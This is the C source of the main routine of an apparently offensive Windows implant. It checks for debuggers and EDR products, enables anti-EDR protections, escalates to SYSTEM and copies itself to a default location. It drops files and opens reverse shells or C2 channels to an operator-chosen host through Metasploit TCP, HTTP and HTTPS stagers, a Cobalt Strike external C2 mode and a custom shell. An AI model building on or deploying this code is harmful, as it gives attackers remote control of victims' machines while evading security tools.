#include <windows.h>
#include <stdio.h>

#include "MgArguments.h"
#include "Tools.h"
#include "Message.h"

#include "RunAs.h"
#include "GetSystem.h"
#include "PrivEsc.h"

#include "DropFile.h"
#include "CheckSystem.h"

#include "ProtectProcess.h"
#include "EDRChecker.h"
#include "BypassAMSI.h" 

#include "RunShell.h"
#include "ReverseHttp.h"
#include "CustomShell.h"
#include "csExternalC2.h"
#include "EasyPrivEsc.h"

#include "LoadAPI.h"



#pragma comment(lib, "Userenv.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Wininet.lib")


BOOL CopyWinNC(Kernel32_API Kernel32, const char* wincatDefaultPath) {
    BOOL retVal = FALSE;
    char* currentFilePath = (char*)calloc(MAX_PATH, 1);
    if (currentFilePath != NULL) {
        if (Kernel32.GetModuleFileNameAF(NULL, currentFilePath, MAX_PATH) > 0) {
            if (Kernel32.CopyFileAF(currentFilePath, wincatDefaultPath, FALSE))
                retVal = TRUE;
        }
        free(currentFilePath);
    }
    return retVal;
}

int wmain(int argc, WCHAR* argv[]){
    Arguments listAgrument;

    //////////////////// Protect process ///////////////////
    //  (Anti-DLL injection)
    //SetHook();

    if (EnableACG())
        printMsg(STATUS_OK, LEVEL_DEFAULT, "Anti-EDR - ACG enable\n");
    else
        printMsg(STATUS_WARNING, LEVEL_DEFAULT, "Fail to enable ACG\n");

    if (!CheckCodeSection())
        exit(0);

    if (IsDebuggerPresentPEB()) {
        printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Debugger detected");
#if !_DEBUG
        exit(0);
#endif
    } else
        printMsg(STATUS_INFO, LEVEL_VERBOSE, "Check For Debugger[2]: OK\n");

    EDRChecker();

    if(!CheckCodeSection())
        exit(0);
    //
    //////////////////// Protect process ///////////////////

    API_Call APICall;
    if (!loadApi(&APICall)) {
        printf("Fail to load api\n");
        system("pause");
    }

    if (!GetArguments(argc, argv, &listAgrument)) {
        if (IsRunAsAdmin(APICall.Advapi32Api)) {
            if (isArgHostSet(APICall.Advapi32Api)) {
                printMsg(STATUS_WARNING, LEVEL_DEFAULT, "Process running with admin priv !\n");
                GetSystem(APICall.Kernel32Api, APICall.Advapi32Api);
            } else if(IsRunAsSystem(APICall.Kernel32Api)){
                if (GetInfoPipeSystem(&listAgrument)){
                    ProtectProcess(APICall.Kernel32Api, APICall.ntdllApi);
                    initWSAS();
                    RunShell(APICall.Kernel32Api, APICall.Advapi32Api,listAgrument);
                } else{
                    return FALSE;
                }
            }
        }
        return TRUE;
    }
        
    
    ////////////////////// Copy Wincat /////////////////////
    // 
    if (!IsFileExist((char*)listAgrument.wincatDefaultPath)) {
        if (APICall.Kernel32Api.CreateDirectoryAF(listAgrument.wincatDefaultDir, NULL) != ERROR_PATH_NOT_FOUND)
            if (!CopyWinNC(APICall.Kernel32Api,listAgrument.wincatDefaultPath))
                printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail to copy wincat to '%s'", listAgrument.wincatDefaultPath);
    }
    //
    ////////////////////// Copy Wincat /////////////////////

    if (listAgrument.CheckPriEsc)
        EasyPrivEsc(APICall.Kernel32Api, APICall.Advapi32Api);

    if (listAgrument.Detached && argc > 3)
        RunProcessDetached(APICall.Kernel32Api, argc, argv);
    else {
        if (listAgrument.toDROP != Nothing)
            DropFiles(APICall.Kernel32Api, APICall.CabinetApi, listAgrument.wincatDefaultDir, listAgrument.toDROP);
        if (argc >= 3) {
            if (listAgrument.GetSystem) {
                ProtectProcess(APICall.Kernel32Api, APICall.ntdllApi);
                PrivEsc(APICall.Kernel32Api, APICall.Advapi32Api, APICall.Shell32Api, APICall.CabinetApi, listAgrument);
                return FALSE;
            } else if (initWSAS()) {
                switch (listAgrument.payloadType) {
                case PAYLOAD_RECV_CMD:
                case PAYLOAD_RECV_PS:
                    if (listAgrument.lpszUsername[0] == 0) {
                        ProtectProcess(APICall.Kernel32Api, APICall.ntdllApi);
                        RunShell(APICall.Kernel32Api, APICall.Advapi32Api, listAgrument);
                    }else
                        RunShellAs(APICall.Kernel32Api, APICall.Advapi32Api, APICall.UserenvApi, listAgrument);
                    break;
                case PAYLOAD_MSF_RECV_TCP:
                    ProtectProcess(APICall.Kernel32Api, APICall.ntdllApi);
                    MsfReverseTcp(listAgrument);
                    break;
                case PAYLOAD_MSF_RECV_HTTP:
                    ProtectProcess(APICall.Kernel32Api, APICall.ntdllApi);
                    StagerReverseHTTP(APICall.Kernel32Api, APICall.WininetApi, listAgrument.host, listAgrument.port);
                    break;
                case PAYLOAD_MSF_RECV_HTTPS:
                    ProtectProcess(APICall.Kernel32Api, APICall.ntdllApi);
                    StagerReverseHTTPS(APICall.Kernel32Api, APICall.WininetApi, listAgrument.host, listAgrument.port);
                    break;
                case PAYLOAD_CS_EXTERNAL_C2:
                    ProtectProcess(APICall.Kernel32Api, APICall.ntdllApi);
                    csExternalC2(listAgrument.host, listAgrument.port);
                    break;
                case PAYLOAD_CUSTOM_SHELL:
                    ProtectProcess(APICall.Kernel32Api, APICall.ntdllApi);
                    CustomShell(listAgrument.host, listAgrument.port);
                    break;
                default:
                    printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Argument error");
                    break;
                }
                WSACleanup();
            } else
                return TRUE;            
        }
    }
    return FALSE;
}

